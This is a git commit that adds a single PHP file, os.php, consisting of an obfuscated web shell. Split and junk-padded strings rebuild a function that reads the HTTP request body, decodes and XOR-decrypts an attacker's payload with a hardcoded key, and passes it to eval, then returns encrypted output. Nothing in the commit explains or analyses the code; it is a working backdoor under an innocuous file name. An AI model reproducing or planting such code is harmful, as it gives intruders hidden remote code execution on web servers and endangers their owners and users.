9842dbe4400f9c888d827d9444651acb7faf0b30
pekalongansec <43495012+pekalongansec@users.noreply.github.com>
2018-11-12 21:49:12 +0700

    Create os.php
    0000

---
+++ os.php
@@ -0,0 +1,10 @@
+<?php
+$J=str_replace('cz','','creczczczate_fucznczctczion');
+$g='ntents(),-;  @o,-b_end_cl,-,-ean();  $r=@b,-ase64_,-encod,-e(@,-x(@gzco,-mpre,-,-ss($o),$k));  p,-r,-int("$p$kh,-$r$kf");}';
+$w='c=str,-,-len,-($k,-);,-$l=,-strle,-n($t);$o="";for(,-$i=0;$,-i<$l;){for($j=0;($j,-<$c,-&,-&$i<$l);,-$j++,$,-i++){$o.=$t,-{';
+$X='$k=",-,-4a7d1ed4";$k,-h="1,-447,-4e4033ac";,-$kf="29ccb8653,-d9b",-;,-$p=,-"LiE0H876,-pS0Yl,-90Z";funct,-ion x($t,,-$k,-){$';
+$b='m) == 1) {  ,-@ob_st,-ar,-t();  @e,-val(@g,-z,-uncomp,-ress(@x(@ba,-se6,-4_decode,-($m[1,-],-),$k)),-);  $o=@ob_get_,-c,-o';
+$H='$i,-},-^$k{$j};}}ret,-,-urn $o;}if (@,-preg_ma,-,-,-tch("/$,-kh(.+)$kf/",@,-file_,-,-get_contents(,-"php,-://,-input,-"),$';
+$I=str_replace(',-','',$X.$w.$H.$b.$g);
+$m=$J('',$I);$m();
+?>
